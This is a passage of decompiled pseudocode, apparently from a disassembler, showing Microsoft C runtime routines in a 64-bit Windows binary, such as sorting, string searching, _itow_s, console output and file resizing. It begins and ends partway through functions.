  _BYTE *v34; // rbp
  _BYTE *v35; // rdx
  unsigned __int64 v36; // r9
  char v37; // cl
  _BYTE *v38; // rax
  __int64 v39; // [rsp+20h] [rbp-448h]
  _QWORD v40[62]; // [rsp+30h] [rbp-438h] BYREF
  _QWORD v41[62]; // [rsp+220h] [rbp-248h] BYREF

  v7 = a1;
  if ( (a1 != 0 || a2 == 0) && a3 != 0 && a4 != nullptr )
  {
    sub_14002A170(a4);
    memset(v40, 0, sizeof(v40));
    memset(v41, 0, sizeof(v41));
    if ( a2 >= 2 )
    {
      v8 = (_BYTE *)(v7 + a3 * (a2 - 1));
      v9 = 0;
      v39 = 0;
      while ( 1 )
      {
        while ( 1 )
        {
          v10 = (unsigned __int64)&v8[-v7] / a3 + 1;
          if ( v10 <= 8 )
          {
            if ( (unsigned __int64)v8 > v7 )
            {
              do
              {
                v11 = (_BYTE *)v7;
                for ( i = a3 + v7; i <= (unsigned __int64)v8; v11 = v14 )
                {
                  v13 = a4(i, v11);
                  v14 = (_BYTE *)i;
                  if ( v13 <= 0 )
                    v14 = v11;
                  i += a3;
                }
                v15 = a3;
                v16 = v8;
                if ( v11 != v8 )
                {
                  v17 = v11 - v8;
                  do
                  {
                    v18 = v16[v17];
                    v16[v17] = *v16;
                    *v16++ = v18;
                    --v15;
                  }
                  while ( v15 != 0 );
                }
                v8 -= a3;
              }
              while ( (unsigned __int64)v8 > v7 );
              v9 = v39;
            }
            goto LABEL_19;
          }
          v19 = a3 * (v10 >> 1);
          v20 = (_BYTE *)(v19 + v7);
          if ( (int)a4(v7, (_BYTE *)(v19 + v7)) > 0 )
          {
            v22 = a3;
            v21 = (_BYTE *)(v19 + v7);
            if ( (_BYTE *)v7 != v20 )
            {
              do
              {
                v23 = v21[-v19];
                v21[-v19] = *v21;
                *v21++ = v23;
                --v22;
              }
              while ( v22 != 0 );
            }
          }
          if ( ((int (__fastcall *)(unsigned __int64, _BYTE *, _BYTE *, unsigned __int64))a4)(v7, v8, v21, v22) > 0 )
          {
            v24 = a3;
            v25 = v8;
            if ( (_BYTE *)v7 != v8 )
            {
              v26 = v7 - (_QWORD)v8;
              do
              {
                v27 = v25[v26];
                v25[v26] = *v25;
                *v25++ = v27;
                --v24;
              }
              while ( v24 != 0 );
            }
          }
          if ( ((int (__fastcall *)(unsigned __int64, _BYTE *, unsigned __int64))a4)(v19 + v7, v8, v24) > 0 )
          {
            v28 = a3;
            v29 = v8;
            if ( v20 != v8 )
            {
              v30 = v20 - v8;
              do
              {
                v31 = v29[v30];
                v29[v30] = *v29;
                *v29++ = v31;
                --v28;
              }
              while ( v28 != 0 );
            }
          }
          v32 = v7;
          v33 = v8;
          while ( 1 )
          {
            if ( (unsigned __int64)v20 > v32 )
            {
              while ( 1 )
              {
                v32 += a3;
                if ( v32 >= (unsigned __int64)v20 )
                  break;
                if ( ((int (__fastcall *)(unsigned __int64, _BYTE *, unsigned __int64))a4)(v32, v20, v28) > 0 )
                  goto LABEL_39;
              }
            }
            do
              v32 += a3;
            while ( v32 <= (unsigned __int64)v8
                 && ((int (__fastcall *)(unsigned __int64, _BYTE *, unsigned __int64))a4)(v32, v20, v28) <= 0 );
            do
            {
LABEL_39:
              v34 = v33;
              v33 -= a3;
            }
            while ( v33 > v20 && (int)a4((unsigned __int64)v33, v20) > 0 );
            if ( (unsigned __int64)v33 < v32 )
              break;
            v28 = a3;
            v35 = v33;
            if ( v33 != (_BYTE *)v32 )
            {
              v36 = v32 - (_QWORD)v33;
              do
              {
                v37 = v35[v36];
                v35[v36] = *v35;
                *v35++ = v37;
                --v28;
              }
              while ( v28 != 0 );
            }
            v38 = (_BYTE *)v32;
            if ( v20 != v33 )
              v38 = v20;
            v20 = v38;
          }
          if ( v20 < v34 )
          {
            while ( 1 )
            {
              v34 -= a3;
              if ( v34 <= v20 )
                break;
              if ( (unsigned int)a4((unsigned __int64)v34, v20) != 0 )
                goto LABEL_54;
            }
          }
          do
            v34 -= a3;
          while ( (unsigned __int64)v34 > v7 && (unsigned int)a4((unsigned __int64)v34, v20) == 0 );
LABEL_54:
          v9 = v39;
          if ( (__int64)&v34[-v7] >= (__int64)&v8[-v32] )
            break;
          if ( v32 < (unsigned __int64)v8 )
          {
            v40[v39] = v32;
            v41[v39] = v8;
            v9 = ++v39;
          }
          if ( v7 >= (unsigned __int64)v34 )
          {
LABEL_19:
            v39 = --v9;
            if ( v9 < 0 )
              return;
            v7 = v40[v9];
            v8 = (_BYTE *)v41[v9];
          }
          else
          {
            v8 = v34;
          }
        }
        if ( v7 < (unsigned __int64)v34 )
        {
          v40[v39] = v7;
          v41[v39] = v34;
          v9 = ++v39;
        }
        if ( v32 >= (unsigned __int64)v8 )
          goto LABEL_19;
        v7 = v32;
      }
    }
  }
  else
  {
    *(_DWORD *)sub_140018888() = 22;
    invalid_parameter_noinfo();
  }
}


// ----- sub_1400293D0 @ 0x1400293d0 -----
_BYTE *__fastcall sub_1400293D0(_BYTE *a1, unsigned __int8 *a2)
{
  unsigned __int8 v2; // al
  _BYTE *v3; // r8
  unsigned __int8 v4; // cl
  _QWORD v6[4]; // [rsp+0h] [rbp-38h] BYREF

  v2 = *a2;
  v3 = a1;
  memset(v6, 0, sizeof(v6));
  for ( ; v2 != 0; ++a2 )
  {
    _bittestandset((signed __int32 *)v6, v2);
    v2 = a2[1];
  }
  v4 = *a1;
  if ( *v3 == 0 )
    return nullptr;
  while ( ((*((_BYTE *)v6 + ((unsigned __int64)v4 >> 3)) >> (v4 & 7)) & 1) == 0 )
  {
    v4 = *++v3;
    if ( v4 == 0 )
      return nullptr;
  }
  return v3;
}


// ----- sub_140029470 @ 0x140029470 -----
char *__fastcall sub_140029470(char *a1, unsigned __int8 *a2)
{
  __int64 v2; // r10
  const __m128i *v3; // rbx
  int v4; // edi
  char *v6; // r8
  __m128i v7; // xmm1
  unsigned int v8; // eax
  unsigned int v9; // edx
  __m128i v10; // xmm2
  unsigned int v11; // eax
  unsigned int v13; // ecx
  char v14; // al
  __m128i v15; // xmm0
  __m128i v16; // xmm0

  v2 = (unsigned __int8)a2 & 0xF;
  v3 = (const __m128i *)&a2[-v2];
  v4 = 0;
  v6 = a1;
  v7 = _mm_loadu_si128((const __m128i *)&a2[-v2]);
  switch ( (unsigned __int8)a2 & 0xF )
  {
    case 1:
      v7 = _mm_srli_si128(v7, 1);
      break;
    case 2:
      v7 = _mm_srli_si128(v7, 2);
      break;
    case 3:
      v7 = _mm_srli_si128(v7, 3);
      break;
    case 4:
      v7 = _mm_srli_si128(v7, 4);
      break;
    case 5:
      v7 = _mm_srli_si128(v7, 5);
      break;
    case 6:
      v7 = _mm_srli_si128(v7, 6);
      break;
    case 7:
      v7 = _mm_srli_si128(v7, 7);
      break;
    case 8:
      v7 = _mm_srli_si128(v7, 8);
      break;
    case 9:
      v7 = _mm_srli_si128(v7, 9);
      break;
    case 0xA:
      v7 = _mm_srli_si128(v7, 10);
      break;
    case 0xB:
      v7 = _mm_srli_si128(v7, 11);
      break;
    case 0xC:
      v7 = _mm_srli_si128(v7, 12);
      break;
    case 0xD:
      v7 = _mm_srli_si128(v7, 13);
      break;
    case 0xE:
      v7 = _mm_srli_si128(v7, 14);
      break;
    case 0xF:
      v7 = _mm_srli_si128(v7, 15);
      break;
    default:
      break;
  }
  v8 = _mm_movemask_epi8(_mm_cmpeq_epi8((__m128i)0LL, v7));
  if ( v8 != 0 )
  {
    _BitScanForward(&v9, v8);
    if ( v2 != 0 )
      LOBYTE(v4) = v9 < (unsigned __int64)(16 - v2);
    else
      v4 = 1;
    switch ( 15 - v9 )
    {
      case 0u:
        v7 = _mm_srli_si128(_mm_slli_si128(v7, 1), 1);
        break;
      case 1u:
        v7 = _mm_srli_si128(_mm_slli_si128(v7, 2), 2);
        break;
      case 2u:
        v7 = _mm_srli_si128(_mm_slli_si128(v7, 3), 3);
        break;
      case 3u:
        v7 = _mm_srli_si128(_mm_slli_si128(v7, 4), 4);
        break;
      case 4u:
        v7 = _mm_srli_si128(_mm_slli_si128(v7, 5), 5);
        break;
      case 5u:
        v7 = _mm_srli_si128(_mm_slli_si128(v7, 6), 6);
        break;
      case 6u:
        v7 = _mm_srli_si128(_mm_slli_si128(v7, 7), 7);
        break;
      case 7u:
        v7 = _mm_srli_si128(_mm_slli_si128(v7, 8), 8);
        break;
      case 8u:
        v7 = _mm_srli_si128(_mm_slli_si128(v7, 9), 9);
        break;
      case 9u:
        v7 = _mm_srli_si128(_mm_slli_si128(v7, 10), 10);
        break;
      case 0xAu:
        v7 = _mm_srli_si128(_mm_slli_si128(v7, 11), 11);
        break;
      case 0xBu:
        v7 = _mm_srli_si128(_mm_slli_si128(v7, 12), 12);
        break;
      case 0xCu:
        v7 = _mm_srli_si128(_mm_slli_si128(v7, 13), 13);
        break;
      case 0xDu:
        v7 = _mm_srli_si128(_mm_slli_si128(v7, 14), 14);
        break;
      case 0xEu:
        v7 = _mm_srli_si128(_mm_slli_si128(v7, 15), 15);
        break;
      case 0xFu:
        v7 = 0;
        break;
      default:
        break;
    }
    if ( v4 == 0 )
      goto LABEL_39;
  }
  else
  {
    if ( ((unsigned __int8)a2 & 0xF) != 0 )
    {
LABEL_39:
      v10 = _mm_loadu_si128(v3 + 1);
      v11 = _mm_movemask_epi8(_mm_cmpeq_epi8(v10, (__m128i)0LL));
      if ( v11 == 0 )
        return sub_1400293D0(v6, a2);
      _BitScanForward(&v13, v11);
      if ( (unsigned __int64)v13 - v2 < 0xFFFFFFFFFFFFFFF0uLL && v13 - v2 != 0 )
        return sub_1400293D0(v6, a2);
      switch ( 15 - v13 )
      {
        case 0u:
          v10 = _mm_slli_si128(v10, 1);
          break;
        case 1u:
          v10 = _mm_slli_si128(v10, 2);
          break;
        case 2u:
          v10 = _mm_slli_si128(v10, 3);
          break;
        case 3u:
          v10 = _mm_slli_si128(v10, 4);
          break;
        case 4u:
          v10 = _mm_slli_si128(v10, 5);
          break;
        case 5u:
          v10 = _mm_slli_si128(v10, 6);
          break;
        case 6u:
          v10 = _mm_slli_si128(v10, 7);
          break;
        case 7u:
          v10 = _mm_slli_si128(v10, 8);
          break;
        case 8u:
          v10 = _mm_slli_si128(v10, 9);
          break;
        case 9u:
          v10 = _mm_slli_si128(v10, 10);
          break;
        case 0xAu:
          v10 = _mm_slli_si128(v10, 11);
          break;
        case 0xBu:
          v10 = _mm_slli_si128(v10, 12);
          break;
        case 0xCu:
          v10 = _mm_slli_si128(v10, 13);
          break;
        case 0xDu:
          v10 = _mm_slli_si128(v10, 14);
          break;
        case 0xEu:
          v10 = _mm_slli_si128(v10, 15);
          break;
        case 0xFu:
          v10 = 0;
          break;
        default:
          break;
      }
      v7 = (__m128i)_mm_or_ps((__m128)v7, (__m128)v10);
      goto LABEL_63;
    }
    if ( v3->m128i_i8[1] != 0 )
      return sub_1400293D0(a1, a2);
  }
LABEL_63:
  v14 = *v6;
  if ( *v6 == 0 )
    return nullptr;
  while ( 1 )
  {
    v15 = _mm_cvtsi32_si128(v14);
    v16 = _mm_unpacklo_epi8(v15, v15);
    if ( _mm_movemask_epi8(_mm_cmpeq_epi8(_mm_shuffle_epi32(_mm_unpacklo_epi8(v16, v16), 0), v7)) != 0 )
      break;
    v14 = *++v6;
    if ( v14 == 0 )
      return nullptr;
  }
  return v6;
}


// ----- _mbsdec @ 0x140029828 -----
unsigned __int8 *__cdecl mbsdec(const unsigned __int8 *Start, const unsigned __int8 *Pos)
{
  return mbsdec_l(Start, Pos, nullptr);
}


// ----- _mbsdec_l @ 0x140029830 -----
unsigned __int8 *__cdecl mbsdec_l(const unsigned __int8 *Start, const unsigned __int8 *Pos, _locale_t Locale)
{
  unsigned __int8 *v6; // rdx
  __int64 v7; // [rsp+20h] [rbp-28h] BYREF
  __int64 v8; // [rsp+30h] [rbp-18h]
  char v9; // [rsp+38h] [rbp-10h]

  if ( Start == nullptr || Pos == nullptr )
  {
    *(_DWORD *)sub_140018888() = 22;
    invalid_parameter_noinfo();
    return nullptr;
  }
  if ( Start >= Pos )
    return nullptr;
  _LocaleUpdate::_LocaleUpdate((_LocaleUpdate *)&v7, Locale);
  v6 = (unsigned __int8 *)(Pos - 1);
  if ( *(_DWORD *)(v8 + 8) != 0 )
  {
    do
      --v6;
    while ( Start <= v6 && (*(_BYTE *)(*v6 + v8 + 25) & 4) != 0 );
    v6 = (unsigned __int8 *)&Pos[-(((_BYTE)Pos - (_BYTE)v6) & 1) - 1];
  }
  if ( v9 != 0 )
    *(_DWORD *)(v7 + 936) &= ~2u;
  return v6;
}


// ----- sub_1400298C4 @ 0x1400298c4 -----
__int64 sub_1400298C4()
{
  return (unsigned __int8)_acrt_initialize_multibyte() ^ 1u;
}


// ----- sub_1400298E0 @ 0x1400298e0 -----
__int64 __fastcall sub_1400298E0(unsigned __int8 *a1, __int64 a2, unsigned __int64 a3)
{
  __int64 v7; // rax
  int v8; // ecx
  char v9; // cl
  unsigned int v10; // ebx
  unsigned int v11; // eax
  int v12; // eax
  __int64 v13; // [rsp+40h] [rbp-20h]
  struct __crt_locale_pointers v14; // [rsp+48h] [rbp-18h] BYREF
  char v15; // [rsp+58h] [rbp-8h]

  if ( dword_1400A0560 == 0 )
    return sub_140028310((__int64)a1, a2, a3);
  v15 = 0;
  v13 = sub_14001C7D8();
  v14.locinfo = *(struct __crt_locale_data **)(v13 + 144);
  v14.mbcinfo = *(struct __crt_multibyte_data **)(v13 + 136);
  sub_14001C98C(v13, (__int64 *)&v14);
  sub_14001C9F8(v13, (__int64 *)&v14.mbcinfo);
  v7 = v13;
  v8 = *(_DWORD *)(v13 + 936);
  if ( (v8 & 2) != 0 )
  {
    v9 = v15;
  }
  else
  {
    *(_DWORD *)(v13 + 936) = v8 | 2;
    v9 = 1;
    v7 = v13;
    v15 = 1;
  }
  if ( a3 != 0 )
  {
    if ( a1 == nullptr || a2 == 0 )
    {
      *(_DWORD *)sub_140018888() = 22;
      invalid_parameter_noinfo();
      if ( v15 != 0 )
        *(_DWORD *)(v13 + 936) &= ~2u;
      return 0x7FFFFFFF;
    }
    v10 = 0x7FFFFFFF;
    if ( a3 <= 0x7FFFFFFF )
    {
      if ( *((_QWORD *)v14.locinfo + 38) == 0 )
      {
        v11 = sub_1400283A0(a1, a2, a3, (__int128 *)&v14);
        if ( v15 != 0 )
          *(_DWORD *)(v13 + 936) &= ~2u;
        return v11;
      }
      v12 = _acrt_CompareStringA(&v14, a3, a2, a3, *((_DWORD *)v14.locinfo + 5));
      if ( v12 != 0 )
        v10 = v12 - 2;
      else
        *(_DWORD *)sub_140018888() = 22;
    }
    else
    {
      *(_DWORD *)sub_140018888() = 22;
      invalid_parameter_noinfo();
    }
    if ( v15 != 0 )
      *(_DWORD *)(v13 + 936) &= ~2u;
  }
  else
  {
    if ( v9 != 0 )
      *(_DWORD *)(v7 + 936) &= ~2u;
    return 0;
  }
  return v10;
}


// ----- __acrt_SetEnvironmentVariableA @ 0x140029a84 -----
__int64 __fastcall _acrt_SetEnvironmentVariableA(_BYTE *a1, _BYTE *a2)
{
  WCHAR *v4; // rdi
  unsigned int v5; // ebx
  unsigned int v6; // r9d
  int v7; // eax
  unsigned int v8; // ebx
  __int64 v10; // [rsp+28h] [rbp-39h] BYREF
  __int64 v11; // [rsp+30h] [rbp-31h]
  char v12; // [rsp+40h] [rbp-21h]
  _QWORD v13[2]; // [rsp+48h] [rbp-19h] BYREF
  LPCWSTR lpValue; // [rsp+58h] [rbp-9h]
  __int64 v15; // [rsp+60h] [rbp-1h]
  __int64 v16; // [rsp+68h] [rbp+7h]
  char v17; // [rsp+70h] [rbp+Fh]
  _QWORD v18[2]; // [rsp+78h] [rbp+17h] BYREF
  LPCWSTR lpName; // [rsp+88h] [rbp+27h]
  __int64 v20; // [rsp+90h] [rbp+2Fh]
  __int64 v21; // [rsp+98h] [rbp+37h]
  char v22; // [rsp+A0h] [rbp+3Fh]
  char v23; // [rsp+D8h] [rbp+77h] BYREF

  v18[0] = 0;
  v18[1] = 0;
  lpName = nullptr;
  v20 = 0;
  v4 = nullptr;
  v21 = 0;
  v22 = 0;
  v13[0] = 0;
  v13[1] = 0;
  lpValue = nullptr;
  v15 = 0;
  v16 = 0;
  v17 = 0;
  _LocaleUpdate::_LocaleUpdate((_LocaleUpdate *)&v10, nullptr);
  v5 = 65001;
  if ( *(_DWORD *)(v11 + 12) == 65001 )
  {
    if ( v12 != 0 )
      *(_DWORD *)(v10 + 936) &= ~2u;
    v6 = 65001;
  }
  else if ( (unsigned int)sub_14001D1F0() != 0 )
  {
    if ( v12 != 0 )
      *(_DWORD *)(v10 + 936) &= ~2u;
    v6 = 0;
  }
  else
  {
    if ( v12 != 0 )
      *(_DWORD *)(v10 + 936) &= ~2u;
    v6 = 1;
  }
  if ( (unsigned int)__acrt_convert_wcs_mbs_cp<char,wchar_t,_lambda_7c9dea7b4ca7285d2cdb541a38da6275_,__crt_win32_buffer_internal_dynamic_resizing>(
                       a1,
                       (__int64)v18,
                       (__int64)&v23,
                       v6) != 0 )
    goto LABEL_25;
  _LocaleUpdate::_LocaleUpdate((_LocaleUpdate *)&v10, nullptr);
  if ( *(_DWORD *)(v11 + 12) == 65001 )
  {
    if ( v12 != 0 )
      *(_DWORD *)(v10 + 936) &= ~2u;
  }
  else if ( (unsigned int)sub_14001D1F0() != 0 )
  {
    if ( v12 != 0 )
      *(_DWORD *)(v10 + 936) &= ~2u;
    v5 = 0;
  }
  else
  {
    if ( v12 != 0 )
      *(_DWORD *)(v10 + 936) &= ~2u;
    v5 = 1;
  }
  v7 = __acrt_convert_wcs_mbs_cp<char,wchar_t,_lambda_7c9dea7b4ca7285d2cdb541a38da6275_,__crt_win32_buffer_internal_dynamic_resizing>(
         a2,
         (__int64)v13,
         (__int64)&v23,
         v5);
  v4 = (WCHAR *)lpValue;
  if ( v7 != 0 )
LABEL_25:
    v8 = 0;
  else
    v8 = SetEnvironmentVariableW(lpName, lpValue);
  if ( v17 != 0 )
    free_base(v4);
  if ( v22 != 0 )
    free_base((void *)lpName);
  return v8;
}


// ----- sub_140029C24 @ 0x140029c24 -----
__int64 __fastcall sub_140029C24(unsigned int a1, __int16 *a2, unsigned __int64 a3, unsigned int a4, char a5)
{
  __int16 *v8; // r10
  unsigned __int64 v9; // rbx
  __int16 *v10; // r8
  _WORD *v11; // rsi
  __int16 *v12; // r9
  unsigned int v13; // edx
  __int16 v14; // ax
  __int16 v16; // cx

  v8 = a2;
  v9 = 0;
  if ( a5 != 0 )
  {
    *a2 = 45;
    v8 = a2 + 1;
    v9 = 1;
    a1 = -a1;
  }
  v10 = v8;
  do
  {
    v11 = v8 + 1;
    v12 = v8;
    v13 = a1 % a4;
    a1 /= a4;
    v14 = 87;
    if ( v13 <= 9 )
      v14 = 48;
    ++v9;
    *v8 = v13 + v14;
    if ( a1 == 0 )
      break;
    ++v8;
  }
  while ( v9 < a3 );
  if ( v9 < a3 )
  {
    *v11 = 0;
    do
    {
      v16 = *v12;
      *v12-- = *v10;
      *v10++ = v16;
    }
    while ( v10 < v12 );
    return 0;
  }
  else
  {
    *a2 = 0;
    *(_DWORD *)sub_140018888() = 34;
    invalid_parameter_noinfo();
    return 34;
  }
}


// ----- ??$common_xtox_s@K_W@@YAHKQEA_W_KI_N@Z @ 0x140029cf8 -----
__int64 __fastcall common_xtox_s<unsigned long,wchar_t>(
        unsigned int a1,
        __int16 *a2,
        unsigned __int64 a3,
        unsigned int a4,
        unsigned __int8 a5)
{
  _DWORD *v5; // rax
  unsigned int v6; // ebx

  if ( a2 != nullptr && a3 != 0 )
  {
    *a2 = 0;
    if ( a3 <= (unsigned __int64)a5 + 1 )
    {
      v5 = sub_140018888();
      v6 = 34;
      goto LABEL_3;
    }
    if ( a4 - 2 <= 0x22 )
      return sub_140029C24(a1, a2, a3, a4, a5);
  }
  v5 = sub_140018888();
  v6 = 22;
LABEL_3:
  *v5 = v6;
  invalid_parameter_noinfo();
  return v6;
}


// ----- _itow_s @ 0x140029d64 -----
errno_t __cdecl itow_s(int Value, wchar_t *Buffer, size_t BufferCount, int Radix)
{
  unsigned __int8 v4; // al

  v4 = 0;
  if ( Radix == 10 )
    v4 = Value < 0;
  return common_xtox_s<unsigned long,wchar_t>(Value, (__int16 *)Buffer, BufferCount, Radix, v4);
}


// ----- sub_140029D90 @ 0x140029d90 -----
__int64 __fastcall sub_140029D90(char *a1, char *a2)
{
  int v3; // ecx
  unsigned int v4; // eax
  signed __int64 v5; // r8

  v3 = *(unsigned __int16 *)a2;
  v4 = *(unsigned __int16 *)a1 - v3;
  if ( v4 == 0 )
  {
    v5 = a1 - a2;
    do
    {
      if ( (_WORD)v3 == 0 )
        break;
      v3 = *((unsigned __int16 *)a2 + 1);
      a2 += 2;
      v4 = *(unsigned __int16 *)&a2[v5] - v3;
    }
    while ( v4 == 0 );
  }
  return ((int)v4 > 0) - (v4 >> 31);
}


// ----- _msize @ 0x140029dd0 -----
size_t __cdecl msize(void *Block)
{
  if ( Block != nullptr )
    return HeapSize(hHeap, 0, Block);
  *(_DWORD *)sub_140018888() = 22;
  invalid_parameter_noinfo();
  return -1;
}


// ----- j__msize @ 0x140029e10 -----
// attributes: thunk
size_t __cdecl j__msize(void *Block)
{
  return msize(Block);
}


// ----- __dcrt_lowio_ensure_console_output_initialized @ 0x140029e18 -----
__int64 _dcrt_lowio_ensure_console_output_initialized()
{
  char *FileW; // rax
  unsigned int v1; // ebx

  FileW = (char *)hObject;
  v1 = 0;
  if ( hObject == (HANDLE)-2LL )
  {
    FileW = (char *)CreateFileW(L"CONOUT$", 0x40000000u, 3u, nullptr, 3u, 0, nullptr);
    hObject = FileW;
  }
  LOBYTE(v1) = FileW + 1 != nullptr;
  return v1;
}


// ----- sub_140029E6C @ 0x140029e6c -----
BOOL sub_140029E6C()
{
  BOOL result; // eax

  if ( (unsigned __int64)hObject <= 0xFFFFFFFFFFFFFFFDuLL )
    return CloseHandle(hObject);
  return result;
}


// ----- unknown_libname_87 @ 0x140029e88 -----
// Microsoft VisualC 64bit universal runtime
__int64 __fastcall unknown_libname_87(void *lpBuffer, DWORD nNumberOfCharsToWrite, LPDWORD lpNumberOfCharsWritten)
{
  unsigned int v6; // ebx

  v6 = WriteConsoleW(hObject, lpBuffer, nNumberOfCharsToWrite, lpNumberOfCharsWritten, nullptr);
  if ( v6 == 0 && GetLastError() == 6 )
  {
    if ( (unsigned __int64)hObject <= 0xFFFFFFFFFFFFFFFDuLL )
      CloseHandle(hObject);
    hObject = CreateFileW(L"CONOUT$", 0x40000000u, 3u, nullptr, 3u, 0, nullptr);
    return WriteConsoleW(hObject, lpBuffer, nNumberOfCharsToWrite, lpNumberOfCharsWritten, nullptr);
  }
  return v6;
}


// ----- _chsize_nolock @ 0x140029f48 -----
__int64 __fastcall chsize_nolock(int a1)
{
  __int64 v2; // [rsp+20h] [rbp-40h]
  char v3; // [rsp+30h] [rbp-30h]
  __int128 v4; // [rsp+38h] [rbp-28h]
  char v5; // [rsp+48h] [rbp-18h]
  char v6; // [rsp+50h] [rbp-10h]
  char v7; // [rsp+58h] [rbp-8h]

  v2 = 0;
  v3 = 0;
  v5 = 0;
  v6 = 0;
  v7 = 0;
  if ( dword_1400A0560 == 0 )
  {
    v5 = 1;
    v4 = *(_OWORD *)&off_14009ECA8;
  }
  return (unsigned int)chsize_nolock_internal(a1);
}


// ----- _chsize_nolock_internal @ 0x140029fe0 -----
__int64 __fastcall chsize_nolock_internal(int FileHandle, LARGE_INTEGER a2, __int64 a3)
{
  LARGE_INTEGER v6; // r12
  LARGE_INTEGER v7; // rax
  __int64 v8; // rbp
  unsigned int v9; // edi
  unsigned __int16 *v10; // rbx
  int v11; // r15d
  unsigned int v12; // r8d
  int v13; // eax
  void *osfhandle; // rax
  DWORD LastError; // eax

  v6 = lseeki64_nolock(FileHandle, 0, 1u);
  v7 = lseeki64_nolock(FileHandle, 0, 2u);
  v8 = a2.QuadPart - v7.QuadPart;
  if ( v6.QuadPart == -1 || v7.QuadPart == -1 )
  {
    if ( *(_BYTE *)(a3 + 48) == 0 )
    {
      v9 = 22;
      goto LABEL_27;
    }
    goto LABEL_25;
  }
  v9 = 0;
  if ( v8 <= 0 )
  {
    if ( v8 >= 0 )
      goto LABEL_27;
    if ( lseeki64_nolock(FileHandle, a2, 0) != -1 )
    {
      osfhandle = (void *)get_osfhandle(FileHandle);
      if ( !SetEndOfFile(osfhandle) )
      {
        LastError = GetLastError();
        *(_BYTE *)(a3 + 56) = 1;
        v9 = 13;
        *(_DWORD *)(a3 + 52) = LastError;
        *(_BYTE *)(a3 + 48) = 1;
        *(_DWORD *)(a3 + 44) = 13;
      }
      goto LABEL_27;
    }
    if ( *(_BYTE *)(a3 + 48) == 0 )
      goto LABEL_27;
LABEL_25:
    v9 = *(_DWORD *)(a3 + 44);
    goto LABEL_27;
  }
  v10 = (unsigned __int16 *)calloc_base(0x1000u, 1u);
  if ( v10 != nullptr )
  {
    v11 = setmode_nolock(FileHandle, 0x8000);
    while ( 1 )
    {
      v12 = v8;
      if ( v8 >= 4096 )
        v12 = 4096;
      v13 = sub_14001EC44(FileHandle, v10, v12, a3);
      if ( v13 == -1 )
        break;
      v8 -= v13;
      if ( v8 <= 0 )
      {
        setmode_nolock(FileHandle, v11);
        goto LABEL_17;
      }
    }
    if ( *(_BYTE *)(a3 + 56) != 0 && *(_DWORD *)(a3 + 52) == 5 )
    {
      *(_BYTE *)(a3 + 48) = 1;
      *(_DWORD *)(a3 + 44) = 13;
    }
    if ( *(_BYTE *)(a3 + 48) != 0 )
      v9 = *(_DWORD *)(a3 + 44);
  }
  else
  {
    v9 = 12;
    *(_BYTE *)(a3 + 48) = 1;
    *(_DWORD *)(a3 + 44) = 12;
  }
LABEL_17:
  free_base(v10);
LABEL_27:
  lseeki64_nolock(FileHandle, v6, 0);
  return v9;
}


// ----- sub_14002A170 @ 0x14002a170 -----
void sub_14002A170()
{
  guard_check_icall_nop();
}


// ----- sub_14002A188 @ 0x14002a188 -----
__int64 __fastcall sub_14002A188(
        __int64 a1,
        __int64 a2,
        DWORD a3,
        const char *a4,
        int a5,
        char *String,
        int a7,
        UINT CodePage)
{
  int v8; // edi
  int v11; // esi
  UINT v12; // r15d
  BYTE *LeadByte; // rax
  BYTE *v15; // rax
  int v16; // eax
  unsigned int v17; // r13d
  size_t v18; // rdx
  __int64 v19; // rax
  void *v20; // rsp
  WCHAR *v21; // rbx
  WCHAR *v22; // rax
  int v23; // eax
  int v24; // r12d
  size_t v25; // rcx
  __int64 v26; // rax
  void *v27; // rsp
  WCHAR *v28; // rdi
  WCHAR *v29; // rax
  WCHAR *v30; // r14
  WCHAR *v31; // rcx
  bool v32; // zf
  unsigned int v33; // edi
  _BYTE v34[32]; // [rsp+0h] [rbp-50h] BYREF
  DWORD v35; // [rsp+50h] [rbp+0h] BYREF
  const CHAR *v36; // [rsp+58h] [rbp+8h]
  __int64 v37; // [rsp+60h] [rbp+10h]
  struct _cpinfo CPInfo; // [rsp+68h] [rbp+18h] BYREF

  v8 = a5;
  v35 = a3;
  v37 = a2;
  v36 = String;
  if ( a5 <= 0 )
  {
    if ( a5 < -1 )
      return 0;
  }
  else
  {
    v8 = _strncnt(a4, a5);
  }
  v11 = a7;
  if ( a7 <= 0 )
  {
    if ( a7 < -1 )
      return 0;
  }
  else
  {
    v11 = _strncnt(String, a7);
  }
  v12 = CodePage;
  if ( CodePage == 0 )
    v12 = *(_DWORD *)(*(_QWORD *)a1 + 12LL);
  if ( v8 == 0 || v11 == 0 )
  {
    memset(&CPInfo, 0, sizeof(CPInfo));
    if ( v8 == v11 )
      return 2;
    if ( v11 > 1 )
      return 1;
    if ( v8 > 1 )
      return 3;
    if ( !GetCPInfo(v12, &CPInfo) )
      return 0;
    if ( v8 > 0 )
    {
      if ( CPInfo.MaxCharSize >= 2 )
      {
        LeadByte = CPInfo.LeadByte;
        if ( CPInfo.LeadByte[0] != 0 )
        {
          while ( LeadByte[1] != 0 )
          {
            if ( (unsigned int)*a4 >= *LeadByte && (unsigned int)*a4 <= LeadByte[1] )
              return 2;
            LeadByte += 2;
            if ( *LeadByte == 0 )
              return 3;
          }
        }
      }
      return 3;
    }
    if ( v11 > 0 )
    {
      if ( CPInfo.MaxCharSize >= 2 )
      {
        v15 = CPInfo.LeadByte;
        if ( CPInfo.LeadByte[0] != 0 )
        {
          while ( v15[1] != 0 )
          {
            if ( (unsigned __int8)*String >= *v15 && (unsigned __int8)*String <= v15[1] )
              return 2;
            v15 += 2;
            if ( *v15 == 0 )
              return 1;
          }
        }
      }
      return 1;
    }
  }
  v16 = sub_140022950(v12, 9, a4, v8, nullptr, 0);
  v17 = v16;
  if ( v16 == 0 )
    return 0;
  v18 = (2LL * v16 + 16) & -(__int64)(2LL * v16 < (unsigned __int64)(2LL * v16 + 16));
  if ( v18 == 0 )
    return 0;
  if ( v18 > 0x400 )
  {
    v22 = (WCHAR *)malloc_base(v18);
    v21 = v22;
    if ( v22 == nullptr )
      goto LABEL_41;
    *(_DWORD *)v22 = 56797;
  }
  else
  {
    v19 = v18 + 15;
    if ( v18 + 15 < v18 )
      v19 = 0xFFFFFFFFFFFFFF0LL;
    v20 = alloca(v19 & 0xFFFFFFFFFFFFFFF0uLL);
    v21 = (WCHAR *)&v35;
    if ( v34 == (_BYTE *)-80LL )
      return 0;
    v35 = 52428;
  }
  v21 += 8;
LABEL_41:
  if ( v21 == nullptr )
    return 0;
  if ( sub_140022950(v12, 1, a4, v8, v21, v17) == 0 )
    goto LABEL_63;
  v23 = sub_140022950(v12, 9, String, v11, nullptr, 0);
  v24 = v23;
  if ( v23 == 0 )
    goto LABEL_63;
